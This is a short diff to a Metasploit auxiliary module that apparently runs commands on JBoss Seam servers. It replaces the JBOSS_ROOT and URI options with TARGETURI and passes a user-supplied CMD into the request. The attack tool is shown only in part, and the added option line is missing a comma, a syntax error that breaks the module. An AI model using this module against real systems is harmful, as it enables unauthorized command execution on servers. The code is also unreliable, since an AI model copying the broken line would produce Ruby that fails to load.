@@ -37,14 +37,13 @@ class Metasploit3 < Msf::Auxiliary
 		register_options(
 			[
 				Opt::RPORT(8080),
-				OptString.new('JBOSS_ROOT',[ true, 'JBoss root directory', '/']),
-				OptString.new('URI',[ true, 'Target URI', 'seam-booking/home.seam']),
+				OptString.new('TARGETURI', [ true 'Target URI', '/seam-booking/home.seam']),
 				OptString.new('CMD', [ true, "The command to execute."])
 			], self.class)
 	end
 
 	def run
-		jbr = normalize_uri(datastore['JBOSS_ROOT'] + datastore['URI'])
+		jbr = normalize_uri(target_uri.to_s)
 		cmd_enc = ""
 		cmd_enc << Rex::Text.uri_encode(datastore["CMD"])
 
